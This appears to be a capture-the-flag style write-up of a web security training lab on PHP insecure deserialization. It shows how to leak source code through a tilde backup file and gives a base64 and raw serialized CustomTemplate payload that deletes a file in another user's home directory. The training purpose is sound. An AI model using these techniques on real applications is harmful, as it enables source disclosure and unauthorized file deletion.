# Description

This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.

You can log in to your own account using the following credentials: `wiener:peter`

# Solution

## Leak source code of php
```html
<!-- TODO: Refactor once /libs/CustomTemplate.php is updated -->
```
found php file from view-source `https://0a2e00ee036340908014997b00610017.web-security-academy.net/libs/CustomTemplate.php`

Using tilda `~` we can access source code of php

```
https://0a54003b043e154982060b30009b0076.web-security-academy.net/libs/CustomTemplate.php~
```

1. **Backup File**: Many text editors, such as Emacs, Vim, and some IDEs, append a tilde to the file name to create a **backup copy** of the **original file** before any modifications are saved. This allows users to recover the previous version if something goes wrong during editing.
    
2. **Temporary File**: Some programs create temporary files with a tilde at the end while they are processing the main file. This can be a safeguard to prevent data loss if the program crashes or if there’s an unexpected interruption.

## Payload

```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjI6e3M6MzQ6IgBDdXN0b21UZW1wbGF0ZQB0ZW1wbGF0ZV9maWxlX3BhdGgiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0IjtzOjMwOiIAQ3VzdG9tVGVtcGxhdGUAbG9ja19maWxlX3BhdGgiO3M6MjM6Ii9ob21lL2Nhcmxvcy9tb3JhbGUudHh0Ijt9
```

raw php payload, attention null characters removed
```php
O:14:"CustomTemplate":2:{s:34:"CustomTemplatetemplate_file_path";s:23:"/home/carlos/morale.txt";s:30:"CustomTemplatelock_file_path";s:23:"/home/carlos/morale.txt";}
```
